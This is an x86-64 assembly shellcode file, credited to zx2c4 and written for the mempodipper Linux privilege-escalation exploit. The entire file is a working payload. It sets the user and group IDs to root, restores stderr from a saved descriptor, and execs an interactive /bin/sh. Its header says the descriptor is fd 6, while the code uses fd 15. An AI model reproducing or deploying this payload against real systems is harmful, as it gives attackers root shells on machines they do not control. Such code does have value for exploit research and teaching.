BITS 64
; This shell code sets uid and gid to 0 and execs a shell in interactive mode.
; It also reopens stderr that was previously saved inside fd 6, for use with mempodipper.
;
; by zx2c4


;setuid(0)
xor rdi,rdi
mov al,0x69
syscall
;setgid(0)
xor rdi,rdi
mov al,0x6a
syscall
;dup2(15, 2)
xor rsi,rsi
mov dil,0xf
mov sil,0x2
mov al,0x21
syscall

; execve("/bin/sh", ["/bin/sh", "-i", 0], 0)
mov qword rbx,'//bin/sh'	; rbx = //bin/sh
shr rbx,0x8			; remove leading / from rbx
push rbx			; push rbx to stack
mov rdi,rsp			; set rdi (arg 1) to top of stack

xor rbx,rbx			; rbx = 0
mov bx,'-i'			; rbx = '-i'
push rbx			; push rbx to stack
mov rcx,rsp			; set rcx to top of stack

xor rax,rax			; rax = 0

; so at this point:
;	rdi is a pointer to '/bin/sh'
;	rcx is a pointer to '-i'
;	rax is null
; since they are all the same size, we'll push them on the stack
; and then it will be an array:
push rax			; push rax to stack
push rcx			; push rcx to stack
push rdi			; push rdi to stack
mov rsi,rsp			; set rsi (arg 2) to top of stack

xor rdx,rdx			; rdx (arg 3) = 0

mov al,0x3b			; al = 0x3b, which is the exec call
syscall
